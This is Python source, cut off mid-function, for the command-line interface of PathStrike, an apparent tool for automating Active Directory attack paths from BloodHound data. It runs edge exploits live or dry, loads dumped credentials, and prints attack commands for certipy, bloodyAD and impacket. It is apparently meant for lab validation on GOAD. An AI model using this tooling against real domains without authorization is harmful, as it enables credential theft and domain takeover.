"""Typer CLI application for PathStrike."""

from __future__ import annotations

import asyncio
import atexit
import shutil
import sys
from datetime import datetime, timezone
from pathlib import Path
from typing import Annotated, Optional

import typer
from rich.console import Console
from rich.table import Table

from pathstrike.bloodhound.client import BloodHoundClient
from pathstrike.config import PathStrikeConfig, find_config, load_config
from pathstrike.engine.checkpoint import CheckpointManager
from pathstrike.engine.credential_store import CredentialStore
from pathstrike.engine.edge_registry import get_supported_edges, list_handlers
from pathstrike.engine.error_handler import RetryPolicy
from pathstrike.engine.rollback import RollbackManager
from pathstrike.logging_setup import print_log_summary, setup_logging
from pathstrike.models import Credential, CredentialType, ExecutionMode

# Importing the handlers package runs every @register_handler decorator,
# populating the edge registry.  Done at CLI import time so that read-only
# commands like `pathstrike edges` see the full registry without first
# having to load the orchestrator/campaign modules.
import pathstrike.handlers  # noqa: F401, E402

app = typer.Typer(
    name="pathstrike",
    help="AD Attack Path Automation via BloodHound CE",
    rich_markup_mode="rich",
    no_args_is_help=True,
)
console = Console()

# Print a single end-of-run hint (if any warnings/errors were logged) when
# the process exits, regardless of which subcommand ran or how it exited
# (normal return, typer.Exit, or KeyboardInterrupt).  The handler is a no-op
# when no warnings were recorded or when setup_logging wasn't called.
atexit.register(lambda: print_log_summary(console))

# ---------------------------------------------------------------------------
# Shared option types
# ---------------------------------------------------------------------------
ConfigOption = Annotated[
    Optional[Path],
    typer.Option(
        "--config",
        "-c",
        help=(
            "Path to YAML configuration file. "
            "If omitted, searches: ./pathstrike.yaml, ./pathstrike.yml, "
            "./.pathstrike.yaml, ~/.config/pathstrike/config.yaml, "
            "~/.pathstrike.yaml"
        ),
    ),
]
SourceOption = Annotated[
    Optional[str],
    typer.Option("--source", "-s", help="Source principal (e.g. USER@DOMAIN.LOCAL). Defaults to credentials.username from config."),
]
VerboseOption = Annotated[
    bool,
    typer.Option("--verbose", "-v", help="Enable debug logging"),
]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _load_config_or_exit(config_path: Path | None) -> PathStrikeConfig:
    """Load and validate config, exiting on failure.

    If *config_path* is ``None``, auto-discover from well-known locations.
    """
    if config_path is None:
        config_path = find_config()
        if config_path is None:
            console.print(
                "[bold red]Config error:[/] No configuration file found.\n"
                "Supply one with [bold]-c path/to/pathstrike.yaml[/] or place it "
                "in one of the default search locations:\n"
                "  • ./pathstrike.yaml\n"
                "  • ./pathstrike.yml\n"
                "  • ./.pathstrike.yaml\n"
                "  • ~/.config/pathstrike/config.yaml\n"
                "  • ~/.pathstrike.yaml"
            )
            raise typer.Exit(code=1)
        console.print(f"[dim]Using config:[/] {config_path}")

    try:
        return load_config(config_path)
    except (FileNotFoundError, ValueError) as exc:
        console.print(f"[bold red]Config error:[/] {exc}")
        raise typer.Exit(code=1) from exc


def _build_target_name(cfg: PathStrikeConfig) -> str:
    """Construct the fully qualified target group name."""
    if cfg.target.custom_target:
        return cfg.target.custom_target
    return f"{cfg.target.group}@{cfg.domain.name.upper()}"


def _build_source_name(source: Optional[str], cfg: PathStrikeConfig) -> str:
    """Ensure the source name is fully qualified with the domain.

    Falls back to ``credentials.username`` from the config when *source* is not
    provided on the command line.
    """
    if source is None:
        source = cfg.credentials.username
    if "@" in source:
        return source.upper()
    return f"{source.upper()}@{cfg.domain.name.upper()}"


def _seed_credential_store(
    cfg: PathStrikeConfig,
    extra_vault: Path | None = None,
) -> CredentialStore:
    """Create a CredentialStore and seed it with the config's initial credentials.

    If ``cfg.credentials.vault_file`` is set (or *extra_vault* is supplied), the
    referenced credential artefact (secretsdump/NTDS dump, hash list, or
    YAML/JSON) is also loaded — every parsed credential is added under the
    config target domain so edges can be tested as their true source principal.
    """
    store = CredentialStore()

    if cfg.credentials.password:
        store.add_credential(
            Credential(
                cred_type=CredentialType.password,
                value=cfg.credentials.password,
                username=cfg.credentials.username,
                domain=cfg.domain.name,
                obtained_from="config",
            )
        )
    if cfg.credentials.nt_hash:
        store.add_credential(
            Credential(
                cred_type=CredentialType.nt_hash,
                value=cfg.credentials.nt_hash,
                username=cfg.credentials.username,
                domain=cfg.domain.name,
                obtained_from="config",
            )
        )
    if cfg.credentials.ccache_path:
        store.add_credential(
            Credential(
                cred_type=CredentialType.ccache,
                value=cfg.credentials.ccache_path,
                username=cfg.credentials.username,
                domain=cfg.domain.name,
                obtained_from="config",
            )
        )

    # Optional bulk credential vault for validation runs.
    vault = extra_vault or (Path(cfg.credentials.vault_file) if cfg.credentials.vault_file else None)
    if vault is not None:
        from pathstrike.engine.credential_vault import load_into_store

        if not vault.is_file():
            console.print(f"[yellow]Credential vault not found:[/] {vault}")
        else:
            n = load_into_store(store, vault, cfg.domain.name)
            console.print(
                f"[green]Loaded {n} credential(s)[/] from vault {vault} "
                f"[dim]({len(store)} total in store)[/]"
            )

    return store


def _build_retry_policy(cfg: PathStrikeConfig) -> RetryPolicy:
    """Build a RetryPolicy from config execution settings."""
    return RetryPolicy(
        max_retries=cfg.execution.max_retries,
    )


# ---------------------------------------------------------------------------
# Rollback log auto-save
# ---------------------------------------------------------------------------

ROLLBACK_LOG_DIR = Path("rollback_logs")


def _save_rollback_log(rollback_mgr: RollbackManager, label: str) -> Path | None:
    """Save rollback actions to a timestamped JSON file if any exist.

    Returns the path to the saved file, or ``None`` if there were no actions.
    """
    if len(rollback_mgr) == 0:
        return None

    ROLLBACK_LOG_DIR.mkdir(parents=True, exist_ok=True)
    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    filename = f"rollback_{label}_{ts}.json"
    log_path = ROLLBACK_LOG_DIR / filename
    rollback_mgr.save_to_file(log_path)
    console.print(
        f"\n[bold cyan]Rollback log saved:[/] {log_path}\n"
        f"[dim]Run 'pathstrike rollback {log_path}' to undo changes.[/]"
    )
    return log_path


def _find_latest_rollback_log() -> Path | None:
    """Find the most recent rollback log file in the rollback_logs directory."""
    if not ROLLBACK_LOG_DIR.exists():
        return None
    logs = sorted(ROLLBACK_LOG_DIR.glob("rollback_*.json"), key=lambda p: p.stat().st_mtime)
    return logs[-1] if logs else None


# ---------------------------------------------------------------------------
# Commands
# ---------------------------------------------------------------------------

@app.command()
def edges(
    verbose: VerboseOption = False,
    fmt: Annotated[
        str,
        typer.Option("--format", "-f", help="Output format: table, json, or csv"),
    ] = "table",
) -> None:
    """List all supported BloodHound edge types and their handlers."""
    setup_logging(verbose=verbose)

    handlers = list_handlers()
    supported = get_supported_edges()

    if not supported:
        console.print("[yellow]No edge handlers registered yet.[/]")
        console.print("[dim]Handlers are registered when handler modules are imported.[/]")
        return

    if fmt == "json":
        import json
        edge_data = [{"edge_type": et, "handler": handlers.get(et, "unknown")} for et in supported]
        console.print(json.dumps(edge_data, indent=2))
        return
    elif fmt == "csv":
        console.print("edge_type,handler")
        for et in supported:
            console.print(f"{et},{handlers.get(et, 'unknown')}")
        return
    # else: default table format

    table = Table(
        title="Supported Edge Types",
        show_header=True,
        header_style="bold cyan",
    )
    table.add_column("Edge Type", style="bold")
    table.add_column("Handler Class", style="green")

    for edge_type in supported:
        table.add_row(edge_type, handlers.get(edge_type, "unknown"))

    console.print(table)
    console.print(f"\n[dim]Total: {len(supported)} edge type(s)[/]")


_OUTCOME_ROW = {
    "success": "[green]✅ success[/]",
    "failed": "[red]❌ failed[/]",
    "exception": "[red]💥 exception[/]",
    "prereq_failed": "[yellow]🟡 prereq[/]",
    "no_handler": "[dim]🚫 no handler[/]",
}

# Exit code per outcome, used so `test-edge` is scriptable.
_OUTCOME_EXIT = {
    "success": 0,
    "failed": 1,
    "exception": 1,
    "no_handler": 1,
    "prereq_failed": 2,
}


def _render_edge_result(result: dict, *, verbose: bool = False) -> None:
    """Pretty-print a single :func:`execute_edge_test` result dict."""
    src, tgt = result["source"], result["target"]
    info = Table.grid(padding=(0, 2))
    info.add_column(style="bold cyan", justify="right")
    info.add_column()
    info.add_row("Edge type", result["edge_type"])
    info.add_row("Handler", result["handler"] or "[red]none[/]")
    info.add_row(
        "Source",
        f"{src['name']} [dim]({src['label']}, "
        f"{'resolved' if src['resolved'] else 'synthesised'})[/]",
    )
    info.add_row(
        "Target",
        f"{tgt['name']} [dim]({tgt['label']}, "
        f"{'resolved' if tgt['resolved'] else 'synthesised'})[/]",
    )
    info.add_row("Mode", "[red]LIVE[/]" if result["mode"] == "live" else "[yellow]dry-run[/]")
    if result["properties"]:
        info.add_row(
            "Properties",
            ", ".join(f"{k}={v}" for k, v in result["properties"].items()),
        )
    console.print(info)
    console.print()

    outcome = result["outcome"]
    if outcome == "no_handler":
        console.print(f"[bold red]🚫 {result['result_msg']}[/]")
        console.print("[dim]Run 'pathstrike edges' to list supported edge types.[/]")
        return

    if result["prereq_ok"]:
        console.print(f"[bold green]✅ Prerequisites OK[/] — {result['prereq_msg']}")
    elif result["prereq_ok"] is False:
        console.print(f"[bold red]❌ Prerequisites failed[/] — {result['prereq_msg']}")
    console.print()

    if outcome == "prereq_failed":
        console.print(
            "[dim]Stopped before exploit. Pass [bold]--force[/] to run the exploit "
            "anyway (useful for capturing the real tool error).[/]"
        )
        return
    if outcome == "exception":
        console.print(f"[bold red]💥 Handler raised:[/] {result['exception']}")
        return
    if outcome == "success":
        console.print(f"[bold green]✅ Success[/] — {result['result_msg']}")
        if result["credentials"]:
            console.print(f"\n[bold]Captured {len(result['credentials'])} credential(s):[/]")
            for c in result["credentials"]:
                console.print(f"  • {c['username']}@{c['domain']} [dim]({c['cred_type']})[/]")
    else:  # failed
        console.print(f"[bold red]❌ Failed[/] — {result['result_msg']}")
        console.print(
            f"\n[bold]Diagnosis:[/] [{result['error_category']}]\n"
            f"[bold]Remediation:[/] {result['remediation']} "
            f"[dim](retryable: {result['retryable']})[/]"
        )


async def _run_revert(cmd: str, settle_seconds: int) -> None:
    """Run the snapshot-revert hook command and wait for the lab to settle."""
    console.print(f"[dim]↻ Reverting snapshot: {cmd}[/]")
    proc = await asyncio.create_subprocess_shell(
        cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
    )
    out, _ = await proc.communicate()
    if proc.returncode != 0:
        console.print(
            f"[yellow]Revert command exited {proc.returncode}: "
            f"{out.decode(errors='replace')[:300]}[/]"
        )
    if settle_seconds > 0:
        console.print(f"[dim]  waiting {settle_seconds}s for the lab to settle...[/]")
        await asyncio.sleep(settle_seconds)


@app.command(name="test-edge")
def test_edge(
    edge_type: Annotated[
        str,
        typer.Argument(help="BloodHound edge type to test (e.g. GenericAll). See 'pathstrike edges'."),
    ],
    target: Annotated[
        str,
        typer.Option("--target", "-t", help="Target principal name, e.g. 'DOMAIN ADMINS@CORP.LOCAL'."),
    ],
    source: SourceOption = None,
    config: ConfigOption = None,
    live: Annotated[
        bool,
        typer.Option("--live", help="Actually execute the exploit. Default is a safe dry-run."),
    ] = False,
    force: Annotated[
        bool,
        typer.Option("--force", help="Run exploit even if prerequisite checks fail (troubleshooting)."),
    ] = False,
    prop: Annotated[
        Optional[list[str]],
        typer.Option("--prop", "-p", help="Extra edge property as key=value (repeatable)."),
    ] = None,
    source_label: Annotated[
        str,
        typer.Option("--source-label", help="Node kind for the source if BH can't resolve it."),
    ] = "User",
    target_label: Annotated[
        str,
        typer.Option("--target-label", help="Node kind for the target if BH can't resolve it."),
    ] = "Group",
    creds_file: Annotated[
        Optional[Path],
        typer.Option("--creds-file", help="Bulk credential vault (secretsdump/NTDS dump, hash list, or YAML/JSON) to authenticate as the edge source."),
    ] = None,
    output_json: Annotated[
        bool,
        typer.Option("--json", help="Emit the structured result as JSON instead of a table."),
    ] = False,
    verbose: VerboseOption = False,
) -> None:
    """Exercise a SINGLE edge handler against the live environment.

    Resolves [bold]source[/] and [bold]target[/] from BloodHound, builds one
    [bold]EdgeInfo[/], then runs the handler's [bold]check_prerequisites[/] and
    [bold]exploit[/] — exactly what the orchestrator does per step, but for one
    edge in isolation.  This is the tight loop for validating edge coverage
    against GOAD: restore a snapshot, run [bold]test-edge[/], read the result,
    restore again.

    Defaults to [bold]dry-run[/]; pass [bold]--live[/] to actually exploit.
    Use [bold]--json[/] for machine-readable output, or [bold]test-edges[/] to
    batch many edges from a plan file.

    [bold]Examples[/]:
      pathstrike test-edge GenericAll -t 'DOMAIN ADMINS@CORP.LOCAL'
      pathstrike test-edge ForceChangePassword -s 'JDOE@CORP.LOCAL' -t 'VICTIM@CORP.LOCAL' --live
      pathstrike test-edge RestorableFrom -t 'OLDSVC@CORP.LOCAL' -p deleted_dn='CN=...' --live
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    from pathstrike.engine.edge_tester import execute_edge_test

    # Parse --prop key=value pairs into the edge property dict.
    edge_props: dict[str, str] = {}
    for item in prop or []:
        if "=" not in item:
            console.print(f"[bold red]Invalid --prop (expected key=value):[/] {item}")
            raise typer.Exit(code=1)
        key, value = item.split("=", 1)
        edge_props[key.strip()] = value

    async def _run() -> dict:
        cred_store = _seed_credential_store(cfg, extra_vault=creds_file)
        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            return await execute_edge_test(
                cfg, client, cred_store,
                edge_type=edge_type, target=target, source=source,
                live=live, force=force, props=edge_props,
                source_label=source_label, target_label=target_label,
            )

    try:
        result = asyncio.run(_run())
    except Exception as exc:
        console.print(f"[bold red]Error:[/] {exc}")
        raise typer.Exit(code=1) from exc

    if output_json:
        import json
        console.print_json(json.dumps(result))
    else:
        _render_edge_result(result, verbose=verbose)

    raise typer.Exit(code=_OUTCOME_EXIT.get(result["outcome"], 0))


def _template_config() -> PathStrikeConfig:
    """A placeholder config for offline `learn` (no target/creds supplied).

    Values are obvious fill-in tokens so emitted commands read as a template:
    ``-u '<USER>@CORP.LOCAL' -hashes ':<NT-HASH>' -dc-ip '<DC-IP>'``.
    """
    return PathStrikeConfig(
        bloodhound={"base_url": "http://localhost:8085", "token_id": "", "token_key": ""},
        domain={"name": "CORP.LOCAL", "dc_host": "<DC-IP>", "dc_fqdn": "dc.corp.local"},
        credentials={"username": "<USER>", "nt_hash": "<NT-HASH>"},
    )


@app.command(name="learn")
def learn(
    edges: Annotated[
        str,
        typer.Argument(
            help="Edge type, or comma-separated path, e.g. 'GenericWrite,GenericAll,ReadGMSAPassword'."
        ),
    ],
    source: SourceOption = None,
    target: Annotated[
        Optional[str],
        typer.Option("--target", "-t", help="Target principal (resolved mode). Defaults to the domain."),
    ] = None,
    config: ConfigOption = None,
    prop: Annotated[
        Optional[list[str]],
        typer.Option("--prop", "-p", help="Extra edge property as key=value (repeatable), e.g. -p template_name=ESC1."),
    ] = None,
    source_label: Annotated[
        str, typer.Option("--source-label", help="Source node kind.")
    ] = "User",
    target_label: Annotated[
        str, typer.Option("--target-label", help="Target node kind.")
    ] = "User",
    creds_file: Annotated[
        Optional[Path],
        typer.Option("--creds-file", help="Credential vault (resolved mode)."),
    ] = None,
    redact: Annotated[
        bool,
        typer.Option("--redact", help="Redact secrets (hashes/passwords) in the printed commands."),
    ] = False,
    steps: Annotated[
        bool,
        typer.Option("--steps", help="Annotated step-by-step output instead of a raw copy-paste block."),
    ] = False,
    verbose: VerboseOption = False,
) -> None:
    """Print the commands PathStrike would run to exploit an edge (or a path).

    A teaching / manual-ops view: it dry-runs the real handler logic but RECORDS
    each tool command (certipy / bloodyAD / impacket / …) in order instead of
    executing it.  So the same tool works for auto (campaign) and manual ops.

    [bold]Resolution[/]: pass [bold]--config[/] (or [bold]--creds-file[/]) to get
    fully-resolved commands with real values + secrets (connects to BloodHound).
    Otherwise it prints an offline template with placeholders ([bold]<DC-IP>[/],
    [bold]<TARGET>[/], [bold]<NT-HASH>[/]); [bold]-s/-t[/] just substitute into it.

    Secrets are shown by default ([bold]--redact[/] to hide).  Raw copy-paste
    block by default ([bold]--steps[/] for annotated).

    [bold]Examples[/]:
      pathstrike learn genericall
      pathstrike learn genericwrite,genericall,ReadGMSAPassword
      pathstrike learn ADCSESC1 -s 'BOB@CORP.LOCAL' -t CORP.LOCAL -p template_name=ESC1 -p ca_name=CORP-CA
    """
    setup_logging(verbose=verbose)

    edge_list = [e.strip() for e in edges.split(",") if e.strip()]
    if not edge_list:
        console.print("[bold red]No edge types given.[/]")
        raise typer.Exit(code=1)

    edge_props: dict[str, str] = {}
    for item in prop or []:
        if "=" not in item:
            console.print(f"[bold red]Invalid --prop (expected key=value):[/] {item}")
            raise typer.Exit(code=1)
        key, value = item.split("=", 1)
        edge_props[key.strip()] = value

    # Resolved mode is opt-in via --config or --creds-file (live values + real
    # secrets, connects to BloodHound).  Bare `learn <edge>` — even with -s/-t —
    # stays an offline template; -s/-t just substitute into the placeholders so
    # a quick reference never silently connects to the lab.
    want_resolved = bool(config) or creds_file is not None
    config_path = config or (find_config() if want_resolved else None)
    resolved_mode = config_path is not None
    if resolved_mode:
        cfg = load_config(Path(config_path))
        tgt = target or cfg.domain.name.upper()
        src = source
    else:
        if want_resolved:
            console.print(
                "[bold red]Resolved mode needs a config.[/] Pass [bold]--config[/], "
                "or drop --creds-file for an offline template."
            )
            raise typer.Exit(code=1)
        cfg = _template_config()
        tgt = target or "<TARGET>"
        src = source or "<SOURCE>"

    from pathstrike.engine.edge_tester import emit_edge_commands

    async def _run() -> list[dict]:
        cred_store = (
            _seed_credential_store(cfg, extra_vault=creds_file)
            if resolved_mode
            else CredentialStore()
        )
        results: list[dict] = []
        if resolved_mode:
            async with BloodHoundClient.connect(cfg.bloodhound) as client:
                for et in edge_list:
                    results.append(await emit_edge_commands(
                        cfg, client, cred_store, edge_type=et, target=tgt, source=src,
                        props=edge_props, source_label=source_label,
                        target_label=target_label, redact=redact,
                    ))
        else:
            for et in edge_list:
                results.append(await emit_edge_commands(
                    cfg, None, cred_store, edge_type=et, target=tgt, source=src,
                    props=edge_props, source_label=source_label,
                    target_label=target_label, redact=redact,
                ))
        return results

    try:
        results = asyncio.run(_run())
    except Exception as exc:
        console.print(f"[bold red]Error:[/] {exc}")
        raise typer.Exit(code=1) from exc

    _render_learn(results, edge_list, resolved_mode, steps)


def _render_learn(
    results: list[dict], edge_list: list[str], resolved_mode: bool, steps: bool
) -> None:
    """Print emitted commands as a raw copy-paste block (default) or steps."""
    mode = "resolved" if resolved_mode else "template (placeholders — fill in <...>)"
    console.print(f"[dim]# pathstrike learn — {' → '.join(edge_list)}  ({mode})[/]")
    any_cmds = False
    for res in results:
        if res.get("error") and not res.get("commands"):
            console.print(f"[bold red]# {res['edge_type']}: {res['error']}[/]")
            continue
        header = f"# === {res['edge_type']} ({res.get('handler') or 'no handler'}) "
        if resolved_mode:
            header += f"| {res.get('source')} -> {res.get('target')} "
        console.print(f"\n[bold cyan]{header}===[/]")
        cmds = res.get("commands") or []
        if not cmds:
            console.print("[dim]#   (no external tool commands — informational/traversal edge)[/]")
            continue
        any_cmds = True
        multi_branch = len({c.get("branch") for c in cmds if c.get("branch")}) > 1
        last_branch = object()
        i = 0
        for c in cmds:
            branch = c.get("branch")
            if multi_branch and branch != last_branch:
                console.print(f"[bold magenta]## Option: {branch or 'core'}[/]")
                last_branch = branch
            if steps:
                i += 1
                note = f"  [dim]# {c['note']}[/]" if c.get("note") else ""
                console.print(f"[bold]{i}.[/] [dim]({c['tool']})[/]{note}")
                console.print(f"   {c['line']}")
            else:
                console.print(c["line"])
        if res.get("error"):
            console.print(f"[dim]#   (chain stopped early: {res['error']})[/]")
    if not any_cmds and not steps:
        console.print("[dim]# (no commands emitted)[/]")


@app.command(name="test-edges")
def test_edges(
    plan: Annotated[
        Path,
        typer.Option("--plan", help="YAML/JSON test plan. Scaffold one with 'pathstrike gen-test-plan'."),
    ],
    config: ConfigOption = None,
    output_dir: Annotated[
        Path,
        typer.Option("--output", "-o", help="Directory for JSONL + summary logs."),
    ] = Path("test_results"),
    update_matrix: Annotated[
        bool,
        typer.Option("--update-matrix/--no-update-matrix", help="Write results back into the coverage matrix."),
    ] = True,
    matrix_path: Annotated[
        Path,
        typer.Option("--matrix", help="Path to the coverage matrix to update."),
    ] = Path("docs/EDGE_STATUS.md"),
    creds_file: Annotated[
        Optional[Path],
        typer.Option("--creds-file", help="Bulk credential vault to authenticate as each edge's source (overrides config vault_file)."),
    ] = None,
    verbose: VerboseOption = False,
) -> None:
    """Run a BATCH of edge tests from a plan, log results, and update the matrix.

    For each test in the plan this runs the same prereq+exploit cycle as
    [bold]test-edge[/], appends a structured record to a timestamped JSONL log,
    and (by default) updates the Status / Last-tested cells in the coverage
    matrix.  Tests marked [bold]destructive: true[/] trigger the plan's
    [bold]revert_cmd[/] snapshot hook beforehand, so the lab is clean each time.

    [bold]Example[/]:
      pathstrike gen-test-plan plan.yaml --category acl
      # edit targets in plan.yaml, set revert_cmd, then:
      pathstrike test-edges --plan plan.yaml
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    from pathstrike.engine.edge_tester import (
        execute_edge_test,
        load_test_plan,
        status_symbol,
        update_matrix_status,
    )

    try:
        plan_data = load_test_plan(plan)
    except Exception as exc:
        console.print(f"[bold red]Failed to load plan {plan}:[/] {exc}")
        raise typer.Exit(code=1) from exc

    tests = plan_data["tests"]
    revert_cmd = plan_data.get("revert_cmd") or None
    settle = int(plan_data.get("revert_settle_seconds", 60))

    output_dir.mkdir(parents=True, exist_ok=True)
    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    jsonl_path = output_dir / f"edge_tests_{ts}.jsonl"
    summary_path = output_dir / f"edge_tests_{ts}.summary.json"
    date_str = datetime.now(timezone.utc).strftime("%Y-%m-%d")

    console.print(f"[bold]Running {len(tests)} edge test(s)[/] -> [cyan]{jsonl_path}[/]")
    if revert_cmd:
        console.print("[dim]Revert hook set; runs before each destructive test.[/]")
    else:
        console.print("[yellow]No revert_cmd in plan — destructive tests will NOT reset the lab.[/]")
    console.print()

    async def _run_all() -> list[dict]:
        import json

        cred_store = _seed_credential_store(cfg, extra_vault=creds_file)
        results: list[dict] = []
        with open(jsonl_path, "w", encoding="utf-8") as fh:
            async with BloodHoundClient.connect(cfg.bloodhound) as client:
                for i, t in enumerate(tests, 1):
                    edge = t["edge"]
                    if t.get("destructive") and revert_cmd:
                        await _run_revert(revert_cmd, settle)

                    result = await execute_edge_test(
                        cfg, client, cred_store,
                        edge_type=edge,
                        target=t["target"],
                        source=t.get("source"),
                        live=bool(t.get("live", False)),
                        force=bool(t.get("force", False)),
                        props=t.get("props") or {},
                        source_label=t.get("source_label", "User"),
                        target_label=t.get("target_label", "Group"),
                    )
                    fh.write(json.dumps(result) + "\n")
                    fh.flush()
                    results.append(result)

                    tag = _OUTCOME_ROW.get(result["outcome"], result["outcome"])
                    extra = (
                        f" [dim]({result['error_category']})[/]"
                        if result["outcome"] == "failed" and result["error_category"]
                        else ""
                    )
                    console.print(
                        f"[dim]{i}/{len(tests)}[/] {tag} "
                        f"{result['edge_type']} -> {result['target']['name']}{extra}"
                    )

                    if update_matrix:
                        sym = status_symbol(result["outcome"], result["mode"] == "live")
                        update_matrix_status(matrix_path, edge, sym, date_str)
        return results

    try:
        results = asyncio.run(_run_all())
    except Exception as exc:
        console.print(f"[bold red]Batch error:[/] {exc}")
        raise typer.Exit(code=1) from exc

    # ---- Summary ----
    from collections import Counter

    counts = Counter(r["outcome"] for r in results)
    summary_table = Table(title="Batch Summary", show_header=True, header_style="bold cyan")
    summary_table.add_column("Outcome", style="bold")
    summary_table.add_column("Count", justify="right")
    for outcome in ("success", "failed", "exception", "prereq_failed", "no_handler"):
        if counts.get(outcome):
            summary_table.add_row(_OUTCOME_ROW.get(outcome, outcome), str(counts[outcome]))
    console.print()
    console.print(summary_table)

    import json

    summary = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "plan": str(plan),
        "total": len(results),
        "counts": dict(counts),
        "jsonl_log": str(jsonl_path),
        "matrix_updated": update_matrix,
    }
    summary_path.write_text(json.dumps(summary, indent=2), encoding="utf-8")
    console.print(f"\n[green]Log:[/] {jsonl_path}\n[green]Summary:[/] {summary_path}")
    if update_matrix:
        console.print(f"[green]Matrix updated:[/] {matrix_path}")


@app.command(name="gen-test-plan")
def gen_test_plan(
    output: Annotated[
        Path,
        typer.Argument(help="Path to write the plan (YAML)."),
    ],
    category: Annotated[
        Optional[str],
        typer.Option("--category", help="Only include edges from this handler module (e.g. acl, adcs, delegation)."),
    ] = None,
    live: Annotated[
        bool,
        typer.Option("--live", help="Mark all generated tests as live (default: dry-run)."),
    ] = False,
) -> None:
    """Scaffold a [bold]test-edges[/] plan seeded from the edge registry.

    Writes one stub per registered edge (optionally filtered to a single
    handler module via [bold]--category[/]).  Edit the ``target`` (and
    ``source``/``props``/``destructive``) fields and set ``revert_cmd``, then
    run [bold]pathstrike test-edges --plan <file>[/].
    """
    import yaml

    from pathstrike.engine.edge_registry import get_registry

    rows = sorted(
        get_registry().items(),
        key=lambda kv: (kv[1].__module__, kv[0]),
    )
    tests: list[dict] = []
    for edge_type, cls in rows:
        module = cls.__module__.split(".")[-1]
        if category and module != category:
            continue
        tests.append({
            "edge": edge_type,
            "target": "REPLACE_ME@DOMAIN.LOCAL",
            "source": None,
            "live": live,
            "destructive": False,
            "props": {},
        })

    if not tests:
        console.print(
            f"[yellow]No edges matched category '{category}'.[/] "
            "Run 'pathstrike edges' to see modules."
        )
        raise typer.Exit(code=1)

    plan = {
        "revert_cmd": "",  # e.g. vmrun -T ws revertToSnapshot /path/GOAD.vmx clean && vmrun -T ws start /path/GOAD.vmx nogui
        "revert_settle_seconds": 60,
        "tests": tests,
    }
    output.write_text(yaml.safe_dump(plan, sort_keys=False, allow_unicode=True), encoding="utf-8")
    console.print(
        f"[green]Wrote {len(tests)} test stub(s) to {output}[/]\n"
        f"[dim]Edit 'target' fields (and 'revert_cmd' for destructive tests), then:\n"
        f"  pathstrike test-edges --plan {output}[/]"
    )


# Edges that read state or grant access without mutating AD objects — these
# don't need a snapshot revert before/after, so the generated plan leaves them
# non-destructive.  Everything else (writes, resets, forging) is destructive.
_READ_ONLY_EDGES = {
    "MemberOf", "AdminTo", "HasSession", "CanRDP", "CanPSRemote", "ExecuteDCOM",
    "ReadLAPSPassword", "ReadGMSAPassword", "DumpSMSAPassword", "SQLAdmin",
    "Contains", "ClaimSpecialIdentity",
}

# Traversal / informational edges with no exploit action of their own.  These
# are excluded from discovery by default: MemberOf especially floods the plan
# (every principal belongs to several groups) and its handler is a no-op
# pass-through, so it validates no tool.  Re-include with --include-traversal.
_NON_ACTIONABLE_EDGES = {"MemberOf", "Contains", "ClaimSpecialIdentity"}


@app.command(name="discover-edges")
def discover_edges(
    output: Annotated[
        Path,
        typer.Argument(help="Path to write the generated test plan (YAML)."),
    ],
    config: ConfigOption = None,
    creds_file: Annotated[
        Optional[Path],
        typer.Option("--creds-file", help="Credential vault — discovery enumerates outbound edges for every principal here."),
    ] = None,
    live: Annotated[
        bool,
        typer.Option("--live", help="Mark generated tests live (default: dry-run)."),
    ] = False,
    revert_cmd: Annotated[
        str,
        typer.Option("--revert-cmd", help="Snapshot-revert hook to embed in the plan (runs before destructive tests)."),
    ] = "",
    include_traversal: Annotated[
        bool,
        typer.Option("--include-traversal", help="Include non-actionable traversal edges (MemberOf, Contains) — skipped by default."),
    ] = False,
    exclude: Annotated[
        Optional[list[str]],
        typer.Option("--exclude", help="Additional edge type(s) to skip (repeatable)."),
    ] = None,
    dedup: Annotated[
        str,
        typer.Option("--dedup", help="Collapse duplicates by: 'edge-target' (default, one source per right+target), 'edge' (one test per edge type), or 'none' (every source)."),
    ] = "edge-target",
    verbose: VerboseOption = False,
) -> None:
    """Build a test plan by enumerating EXPLOITABLE edges from held credentials.

    For every principal you have a credential for (config + [bold]--creds-file[/]
    vault), this queries BloodHound for that principal's outbound handler-backed
    edges and their concrete targets, then writes a [bold]test-edges[/] plan with
    real (source -> target) pairs.  This is the "iterate creds -> find every
    escalation -> test them all" step for a comprehensive validation pass.

    Write edges are marked [bold]destructive: true[/] so the plan's revert hook
    fires before them; read/access edges are left non-destructive.

    [bold]Example[/]:
      pathstrike discover-edges plan.yaml --creds-file north.ntds \\
        --revert-cmd 'cd ~/GOAD && vagrant snapshot restore clean'
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    import yaml

    from pathstrike.bloodhound.cypher import build_outbound_exploitable_edges_query

    cred_store = _seed_credential_store(cfg, extra_vault=creds_file)

    # Unique sAMAccountNames we hold credentials for.
    principals = sorted({c.username for c in cred_store.all_credentials()})
    if not principals:
        console.print("[yellow]No credentials in store — set credentials in config or pass --creds-file.[/]")
        raise typer.Exit(code=1)

    domain = cfg.domain.name
    skip_edges = set(exclude or [])
    if not include_traversal:
        skip_edges |= _NON_ACTIONABLE_EDGES
    console.print(f"[bold]Enumerating exploitable edges for {len(principals)} principal(s) in {domain.upper()}...[/]")
    if skip_edges:
        console.print(f"[dim]Skipping edge types: {', '.join(sorted(skip_edges))}[/]")

    skipped_total = 0

    async def _discover() -> list[dict]:
        nonlocal skipped_total
        seen: set[tuple[str, str, str]] = set()
        tests: list[dict] = []
        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            for sam in principals:
                source = f"{sam}@{domain}".upper()
                query, _ = build_outbound_exploitable_edges_query(source)
                try:
                    resp = await client.cypher_query(query)
                except Exception as exc:  # noqa: BLE001
                    logger_msg = str(exc)
                    if "404" not in logger_msg and "not found" not in logger_msg.lower():
                        console.print(f"[dim]  {source}: query failed ({logger_msg[:120]})[/]")
                    continue

                literals = resp.get("data", {}).get("literals", []) or []
                count = 0
                for lit in literals:
                    if lit.get("key") != "edge_row" or not lit.get("value"):
                        continue
                    fields = lit["value"].split("|")
                    if len(fields) < 3:
                        continue
                    edge_type, target_name, target_kind = fields[0], fields[1], fields[2]
                    if edge_type in skip_edges:
